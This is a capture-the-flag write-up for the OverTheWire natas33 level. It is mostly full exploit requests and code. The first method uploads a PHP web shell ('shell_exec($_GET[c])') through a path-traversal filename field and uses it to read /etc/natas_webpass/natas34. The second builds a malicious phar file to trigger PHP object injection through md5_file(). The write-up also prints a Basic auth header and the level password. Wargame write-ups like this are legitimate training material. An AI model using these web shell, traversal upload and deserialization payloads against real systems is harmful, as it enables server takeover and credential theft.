# natas34

A shortcut

This is not the designed way to get the password

The page http://natas33.natas.labs.overthewire.org/index.pl has a hidden input filename, which allows the file to be uploaded to any path (with traversal), as long as the folder is writable. From the last challenge we got RCE on the server, and was able to find that there exists a folder /var/www/natas/natas33-new with is writable by current user natas33. Thus, we can upload a PHP shell to this folder and get RCE, as follows.

POST /index.php HTTP/1.1
Host: natas33.natas.labs.overthewire.org
Content-Length: 475
Cache-Control: max-age=0
Authorization: Basic bmF0YXMzMzpzaG9vZ2VpR2EyeWVlM2RlNkFleDh1YVhlZWNoNWVleQ==
Origin: http://natas33.natas.labs.overthewire.org
Content-Type: multipart/form-data; boundary=—-WebKitFormBoundaryrDg9m1cnIOTLcDtc
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/75.0.3770.100 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,_/_;q=0.8,application/signed-exchange;v=b3
Referer: http://natas33.natas.labs.overthewire.org/index.php
Accept-Encoding: gzip, deflate
Accept-Language: en-US,en;q=0.9,zh-CN;q=0.8,zh;q=0.7,ja;q=0.6
Connection: close

——WebKitFormBoundaryrDg9m1cnIOTLcDtc
Content-Disposition: form-data; name=”MAX_FILE_SIZE”

4096
——WebKitFormBoundaryrDg9m1cnIOTLcDtc
Content-Disposition: form-data; name=”filename”

../../var/www/natas/natas33-new/index.php
——WebKitFormBoundaryrDg9m1cnIOTLcDtc
Content-Disposition: form-data; name=”uploadedfile”; filename=”abcd”
Content-Type: application/octet-stream

<?php echo shell_exec($_GET[‘c’]); ?>

——WebKitFormBoundaryrDg9m1cnIOTLcDtc–

Use the uploaded webshell to get the password:

http://natas33-new.natas.labs.overthewire.org/index.php?c=cat%20/etc/natas_webpass/natas34

The right way

From the source code, there is a md5_file() that directly takes the user input filename as its parameter. It is vulnerable to PHP Object Injection as described in What is Phar Deserialization.

In brief, the function md5_file() with parameter like 'phar://[phar_file].phar' will deserialize the object inside Metadata of phar and invoke the functions**destruct() and **wakeup() for target classes. Moreover, the variables in the classes can also be changed to arbitrary value. A list of vulnerable functions can be found here.

For this challenge, if we can craft a phar file, upload it to the server and send its path to the md5_file() function, we can trigger this bug and execute the \_\_destruct() function under class Executor. In order to pass the if clause and get to the passthru() function, we need to rewrite the filename and signature varibles by injecting a PHP object of class Executor. The following PHP code generates the crafted phar file.

```php
<?php
$phar = new Phar(‘test.phar’);
$phar->startBuffering();
$phar->setStub(‘<?php __HALT_COMPILER(); ? >’); // Somehow required by PHP

class Executor{
private $filename=’shell.php’;
private $signature='[MD5 for the shell.php]’;
}
$object = new Executor();
$phar->setMetadata($object);
$phar->addFromString(‘test.txt’, ‘text’); // Somehow required by PHP
$phar->stopBuffering();

?>
```

For the test.txt, simply create an empty file.

The shell.php is the PHP file that executes our actual web shell. For example:

```php
<?php
echo file_get_contents(‘/etc/natas_webpass/natas34’);
```
Save the file and calculate its MD5 digest (md5_file('shell.php') works). Put the hash into the signature variable and generate the test.phar.

Now we have two files in hand – shell.php and test.phar. We need to upload these two files to the server and remember where they are. A good way is to intercept the POST request and modify the form-data filename.

Suppose we have uploaded these two files with their initial names to the server, which will be put under /natas33/upload/. Now we need to trigger the md5_file() bug to inject PHP object, to run the __destruct() function which loads our special variables, to pass the if clause and get to the passthru() function:


POST /index.php HTTP/1.1
Host: natas33.natas.labs.overthewire.org
Content-Length: 420
Cache-Control: max-age=0
Authorization: Basic bmF0YXMzMzpzaG9vZ2VpR2EyeWVlM2RlNkFleDh1YVhlZWNoNWVleQ==
Origin: http://natas33.natas.labs.overthewire.org
Content-Type: multipart/form-data; boundary=—-WebKitFormBoundaryLyBTS2TxqLDkk37I
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/75.0.3770.100 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3
Accept-Encoding: gzip, deflate
Accept-Language: en-US,en;q=0.9,zh-CN;q=0.8,zh;q=0.7,ja;q=0.6
Connection: close

——WebKitFormBoundaryLyBTS2TxqLDkk37I
Content-Disposition: form-data; name=”MAX_FILE_SIZE”

4096
——WebKitFormBoundaryLyBTS2TxqLDkk37I
Content-Disposition: form-data; name=”filename”

phar://test.phar
——WebKitFormBoundaryLyBTS2TxqLDkk37I
Content-Disposition: form-data; name=”uploadedfile”; filename=”test.phar”
Content-Type: application/octet-stream

File content doesn’t matter here…
——WebKitFormBoundaryLyBTS2TxqLDkk37I–

From the HTTP response, we can see that the first __destruct() function fails to pass the if clause since it’s the original object that the page created, but the second __destruct() function invoked by our injected object succeeds, which actually calculates if(md5_file('shell.php') == '[MD5 for shell.php]') which is absolutely true. Then the shell.php is passed to the passthru() function, and we get the RCE!

Password: shu5ouSu6eicielahhae0mohd4ui5uig



and finally:

Displaying a placeholder page. For now this is the end.